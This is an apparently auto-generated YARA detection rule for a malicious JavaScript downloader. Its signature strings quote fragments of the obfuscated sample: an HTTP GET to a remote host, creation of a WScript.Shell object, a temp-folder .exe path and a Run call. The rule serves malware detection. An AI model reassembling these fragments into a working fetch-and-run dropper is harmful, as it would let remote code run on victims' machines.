rule sig_20160330_8139d6ba6f0f2bf9fd445c8d1f4dd2c2 {
  meta:
    description = "datamaliciousorder - file 20160330_8139d6ba6f0f2bf9fd445c8d1f4dd2c2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3952e07a0ab9b9c34f1c1334035dc28729a92e23a46f2306ea30e5f483d804a0"

  strings:
    $s1  = "_NC[_QQ](\"GET\", \"http://bonares.pl/x9isa\", false);" fullword ascii
    $s2  = "var _D2 = function _SA() {return WScript[_K](\"WScript\"+\".Shell\");}(), _Z1 = 11;" fullword ascii
    $s3  = "function _D(_AL, _K0){_B = _B * 1; return _AL - _K0;};" fullword ascii
    $s4  = "if (_NC[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _DR(){return _F + \"\";};" fullword ascii
    $s6  = "function _P() {return _D2[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Ow5vNwRV.ex\" + \"e\";};" fullword ascii
    $s7  = "function _R() {return ((_J0 == true) && (_J0 == _N)) ? 1 : _B;};" fullword ascii
    $s8  = "function _PX(_J){_D2[\"Run\"](_J, _B, _B);};" fullword ascii
    $s9  = "function _C()" fullword ascii
    $s10 = " while (_XY){" fullword ascii
    $s11 = "function _UG(){return 22;};" fullword ascii
    $s12 = "function _Z(_D0) {var _E = (1, 2, 3, 4, 5, _D0); return _E;};" fullword ascii
    $s13 = "return _D(_EO, _HO);" fullword ascii
    $s14 = "function _PS(){return _K;};" fullword ascii
    $s15 = "var _G = new this[\"Date\"]();" fullword ascii
    $s16 = "_J0 = true; " fullword ascii
    $s17 = "var _J0 = false;" fullword ascii
    $s18 = "var _N = false;" fullword ascii
    $s19 = "_N = true; " fullword ascii
    $s20 = "var _JU = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}